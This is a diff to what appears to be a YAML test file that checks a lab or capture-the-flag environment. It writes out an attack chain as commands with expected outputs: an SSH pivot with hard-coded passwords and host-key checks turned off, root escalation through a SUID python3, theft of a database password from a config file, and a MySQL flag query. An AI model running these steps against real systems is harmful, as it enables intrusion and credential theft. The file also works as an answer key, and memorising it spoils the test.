@@ -123,22 +123,22 @@ test:
       expect: "z3n1th"
 
     - name: "Pivot to appserver with discovered SSH credentials"
-      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'whoami' 2>/dev/null"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'whoami' 2>&1"
       expect: "appuser"
       timeout: 15
 
     - name: "Privesc via SUID python3 and read marker 2"
-      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>/dev/null"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /root/marker.txt\\\")\"' 2>&1"
       expect: "pwn3d"
       timeout: 15
 
     - name: "Extract DB credentials from appserver config"
-      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>/dev/null | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"
+      command: "sshpass -p 'Z3n1th_App_2024#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null appuser@{target.appserver} 'python3 -c \"import os;os.setuid(0);os.system(\\\"cat /opt/zenith/db.conf\\\")\"' 2>&1 | grep -o 'DB_PASS=[^ ]*' | sed 's/DB_PASS=//'"
       expect: "Z3n_DB_Pr0d#"
       timeout: 15
 
     - name: "Query database for marker 3"
-      command: "mysql -h {target.datastore} -u zenith_app -p'Z3n_DB_Pr0d#' zenith -N -e 'SELECT value FROM flags WHERE name=\"assessment\"' 2>/dev/null"
+      command: "mysql -h {target.datastore} -u zenith_app -p'Z3n_DB_Pr0d#' zenith -N -e 'SELECT value FROM flags WHERE name=\"assessment\"' 2>&1"
       expect: "v1ct0ry"
       timeout: 20
 
